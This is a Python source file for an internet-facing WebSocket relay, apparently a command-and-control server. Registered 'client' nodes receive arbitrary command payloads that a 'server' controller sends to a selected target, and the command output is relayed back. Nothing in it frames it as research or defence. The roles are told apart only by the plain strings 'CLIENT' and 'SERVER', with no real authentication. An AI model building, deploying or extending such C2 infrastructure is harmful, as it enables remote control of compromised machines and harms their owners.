import os
import asyncio
import websockets
import json

connections = {}
client_count = 0
server_count = 0

async def handle_connection(websocket, path=None):
    global client_count, server_count
    identity = None
    assigned_target = None
    
    try:
        # Evaluate initial verification token string frame
        handshake = await websocket.recv()
        handshake = handshake.strip().upper()
        
        if handshake == "CLIENT":
            client_count += 1
            identity = f"client{client_count}"
            connections[identity] = websocket
            print(f"[+] Node registered: {identity}")
            await websocket.wait_closed()
            
        elif handshake == "SERVER":
            server_count += 1
            identity = f"server{server_count}"
            print(f"[+] Controller authenticated: {identity}")
            
            async for message in websocket:
                try:
                    data = json.loads(message)
                    action = data.get("action")
                    
                    if action == "list":
                        clients = [k for k in connections.keys() if k.startswith("client")]
                        await websocket.send(json.dumps({"type": "menu", "data": clients}))
                        
                    elif action == "select":
                        target_name = data.get("target")
                        if target_name in connections:
                            assigned_target = target_name
                            await websocket.send(json.dumps({"type": "status", "data": f"Pinned routing to {target_name}"}))
                        else:
                            await websocket.send(json.dumps({"type": "status", "data": "Target endpoint offline"}))
                            
                    elif action == "cmd":
                        payload = data.get("payload")
                        if assigned_target and assigned_target in connections:
                            # Direct delivery of command text down the websocket link
                            await connections[assigned_target].send(payload)
                            # Pull the single reassembled chunk string reply frame out
                            response = await connections[assigned_target].recv()
                            await websocket.send(json.dumps({"type": "output", "data": response}))
                        else:
                            await websocket.send(json.dumps({"type": "status", "data": "Error: Command context missing unmapped target device"}))
                except Exception as e:
                    print(f"[-] Structural parse failure on server transaction: {e}")
                    
    except Exception as e:
        print(f"[-] Session lifecycle termination event noted for {identity}: {e}")
    finally:
        if identity in connections:
            del connections[identity]
            print(f"[-] Node removed from router table: {identity}")

async def main():
    # Railway passes the port requirement downstream dynamically into environment profiles
    port = int(os.environ.get("PORT", 5555))
    async with websockets.serve(handle_connection, "0.0.0.0", port, ping_interval=20, ping_timeout=20):
        print(f"[!] Multiplexed WebSocket Engine listening on port {port}...")
        await asyncio.Future()

if __name__ == "__main__":
    asyncio.run(main())
